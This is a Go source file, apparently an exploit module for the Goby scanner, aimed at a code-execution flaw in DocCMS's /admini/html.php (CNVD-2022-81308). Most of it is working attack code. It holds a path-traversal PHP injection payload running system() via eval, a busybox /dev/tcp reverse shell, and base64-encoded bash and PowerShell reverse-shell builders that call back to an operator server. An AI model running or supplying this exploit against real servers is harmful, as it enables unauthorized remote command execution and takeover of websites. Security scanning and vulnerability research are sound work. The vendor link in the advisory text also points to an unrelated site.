package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Doccms /admini/html.php Code Execution Vulnerability(CNVD-2022-81308)",
    "Description": "<p>Doccms system is a simple and practical company website display system developed by Zhuhai Nine Time Technology Co., LTD.</p><p>The html.php file of Doccms system 2021 and earlier has any file containing vulnerability, which allows an attacker to execute code through the vulnerability, and then execute commands on the server to obtain server permissions.</p>",
    "Product": "DocCMS",
    "Homepage": "http://www.doccms.com",
    "DisclosureDate": "2024-09-23",
    "PostTime": "2024-09-23",
    "Author": "3013320359@qq.com",
    "FofaQuery": "body=\"Power by DocCms\" && header=\"PHP\"",
    "GobyQuery": "body=\"Power by DocCms\" && header=\"PHP\"",
    "Level": "3",
    "Impact": "<p>attacker can execute code through the vulnerability, and then execute commands on the server to obtain server permissions.</p>",
    "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner:<a href=\"http://www.doccms.com\">http://www.doccms.com</a><a href=\"https://www.surfboard.com/\"></a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit the public from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/admini/html.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "m=/../../../admini/views/system/lang/editTags.php&tags=1);echo md5(123);//\\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b7",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "2H1W"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2022-81308"
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "Doccms /admini/html.php 代码执行漏洞（CNVD-2022-81308）",
            "Product": "DocCMS",
            "Description": "<p>Doccms系统是由珠海玖时光科技有限公司开发的一款简洁实用的公司网站展示系统。<br></p><p>Doccms系统2021及之前的版本的html.php文件存在任意文件包含漏洞，攻击者可以通过漏洞执行代码，进而在服务器执行命令，获取服务器权限。<br></p>",
            "Recommendation": "<p>1、官方未修复该漏洞，请用户联系厂商进行修复：<a href=\"https://www.surfboard.com/\">http://www.doccms.com</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可以通过漏洞执行代码，进而在服务器执行命令，获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Doccms /admini/html.php Code Execution Vulnerability(CNVD-2022-81308)",
            "Product": "DocCMS",
            "Description": "<p>Doccms system is a simple and practical company website display system developed by Zhuhai Nine Time Technology Co., LTD.</p><p>The html.php file of Doccms system 2021 and earlier has any file containing vulnerability, which allows an attacker to execute code through the vulnerability, and then execute commands on the server to obtain server permissions.</p>",
            "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner:<a href=\"http://www.doccms.com\">http://www.doccms.com</a><a href=\"https://www.surfboard.com/\"></a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit the public from accessing the system.</p>",
            "Impact": "<p>attacker can execute code through the vulnerability, and then execute commands on the server to obtain server permissions.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9956"
}`
	setPayloadRequestHashTQ9uwsBDNV := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		vulPath := "/admini/html.php"
		postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Data =  "8=system(\"" + command + "\");&m=/../../../admini/views/system/lang/editTags.php&tags=1);echo md5(123);eval(stripslashes($_REQUEST[8]));echo md5(123);//"
		//请求头
		head := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}
		for headName, headValue := range head {
			postRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil || response == nil {
			return "", "", err
		} //错误检查
		regStr := `202cb962ac59075b964b07152d234b70([\s\S]*?)202cb962ac59075b964b07152d234b70` //正则表达式
		regObj := regexp.MustCompile(regStr)
		if !regObj.MatchString(response.RawBody) {
			return "", "", errors.New("RCE Fail")
		}
		getname := regObj.FindStringSubmatch(response.RawBody)

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := getname[1]
		if len(commandResult) == 0 {
			return "", "", errors.New("RCE Fail")
		}
		return commandResult, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashTQ9uwsBDNV

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashTQ9uwsBDNV

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
